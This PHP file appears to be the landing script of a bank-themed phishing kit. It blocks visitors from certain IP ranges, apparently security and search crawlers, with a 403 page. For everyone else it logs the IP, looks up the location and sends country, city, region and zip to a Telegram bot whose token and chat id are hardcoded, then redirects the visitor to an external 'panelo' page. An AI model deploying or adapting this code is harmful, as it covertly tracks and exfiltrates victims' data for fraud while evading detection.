<?php
$ip = getenv("REMOTE_ADDR");

// Check if the IP address starts with "35.83"
if (strpos($ip, "35.83") === 0 || strpos($ip, "74.125") === 0 || strpos($ip, "105.155") === 0) {
    // welcome wot my fenominal page
    header("HTTP/1.1 403 Forbidden");
    echo "welcome wot my fenominal page";
    exit;
}

// Continue with your script for allowed IP addresses
// ...

$file = fopen("ARDUINO_DAS_VISIT.txt", "a");
fwrite($file, $ip . "  -  " . gmdate("Y-n-d") . " @ " . gmdate("H:i:s") . "\n");

$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/" . $ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$CITY = $IP_LOOKUP->city . "\r\n";
$REGION = $IP_LOOKUP->region . "\r\n";
$STATE = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";

$msg = $ip . "\nCountry : " . $COUNTRY . "CityTFBank: " . $CITY . "RegionTFBank : " . $REGION . "StateTFBank: " . $STATE . "ZipTFBank : " . $ZIPCODE;

file_get_contents("https://api.telegram.org/bot6440760070:AAHvsP8bCBVMZKH9Q9mTm5o4UA7Qj90BuD4"
    . $api . "/sendMessage?chat_id=-980803077" . $chatid . "&text=" . urlencode($msg) . "");

header("Location: https://infos-com.stackstaging.com/panelo/");
?>
